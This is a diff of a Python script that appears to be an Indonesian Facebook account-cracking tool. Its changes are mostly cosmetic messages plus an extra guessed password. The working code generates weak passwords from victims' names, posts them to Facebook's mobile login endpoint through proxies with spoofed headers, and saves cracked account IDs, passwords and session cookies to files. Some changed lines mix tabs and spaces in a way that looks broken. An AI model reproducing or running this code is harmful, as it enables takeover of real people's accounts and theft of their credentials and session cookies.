@@ -623,7 +623,7 @@ def setting():
 	exit() 
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	cetak(nel('[bold cyan]               SELAMAT MENUNGGU HASIL, SEMOGA BERUNTUNG[bold cyan]')) 
+	cetak(nel('[bold cyan]  SABAR CONG MSIH DALAM PROSES [bold cyan]')) 
 	print(f'                    {m}H {k}A {h}R {u}A {b}P {u}  ★  {b}S {u}A {h} B{k} A{m} R{b}')
 	print('')
 	print(f'➥➥➣Hasil {h}OK{u} Tersimpan Di : {h}OK/%s {b}'%(okc))
@@ -639,16 +639,18 @@ def passwrd():
 					pass
 				else:
 					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
+                                        pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
+                                        pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
@@ -697,8 +699,8 @@ def crack(idf,pwv):
 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(nel('  [red]     😴😭MOHON MAAF ANDA BELUM BERUNTUNG MOHON BERSABAR😭😴[red]'))
-				print(f'\r{K}>> {idf}|{pw}{N}')     
+				cetak(nel('  [red] TETAP BERSYUKUR BIAR CP[red]'))
+				print(f'\r{K}[KRIBO-CP] {idf}|{pw}{N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -707,9 +709,9 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(nel('[green]      🎀🤣 SELAMAT ANDA SEDANG HOKI HARI INI 🤣🎀[green]')) 
-				print(f'\r{H}>> {idf}|{pw}|{kuki}\n{ua}{N}')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				cetak(nel('[green] KRIBO GANTENG-OK[green]')) 
+				print(f'\r{H}[KRIBO-OK] {idf}|{pw}|{kuki}{N}')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				cek_apk(session,coki)
 				break
 				
@@ -1042,6 +1044,10 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('touch .prox.txt')
 	except:pass
+        try:os.system('clear')
+	except:pass
+	alvino_xy(f'\n\t{x}——> {h}Gunakan Script Ini Sewajarnya\n\t{x}——> {h}Jika Ada Bug/Error Bilang Yahh\n\t{x}——> {h}KRIBO Ganteng Selalu Yah\n\t{x}——> {h}Semoga Di Mudahkan Rezekinya Amin\n\t{x}——> {h}Semoga Harimu Menyenangkan Sayang\n\t{x}——> {h}Semoga Hasil Mu Cp Terus Mweheh{x}')
+	time.sleep(3)
 	login()
 
 #>>>>> THANKS TO THIS HERE <<<<<<<#
